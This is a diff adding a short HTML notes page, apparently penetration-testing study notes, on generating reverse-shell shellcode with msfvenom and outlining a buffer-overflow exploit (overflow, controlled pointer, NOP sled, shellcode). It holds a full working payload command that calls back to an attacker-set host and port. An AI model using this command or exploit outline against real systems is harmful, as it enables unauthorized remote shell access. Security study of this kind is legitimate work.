@@ -1,0 +1,19 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>generating shellcode MSF</title>
+</head><body><span style="font-size: 18pt">Generating shellcode with msf<ul><li style="list-style-type: none">&gt;msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.4 LPORT=444 EXITFUNC=thread -f c -a x86 -b &quot;\x00&quot;</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><b>breakdown</b>: msfvenom -p {payload} LHOST={Your IP} LPORT={port} EXITFUNC=thread -f c -a x86 -b &quot;\x00&quot;</li>
+<li style="list-style-type: none"/>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</span><span style="font-size: 18pt">======================================================================================================</span><br/>
+<img height="320" src="image.png" width="600"/><br/>
+<br/>
+<img src="image 2.png"/><br/>
+<img src="image 3.png"/><br/>
+breakdown of code:<br/>
+script connects &gt;&gt; inserts shellcode into command &gt;&gt; starts with buffer overflow &gt;&gt; inserts pointer that we control &gt;&gt; insert shellcode (add NOP sled tho)</body></html>
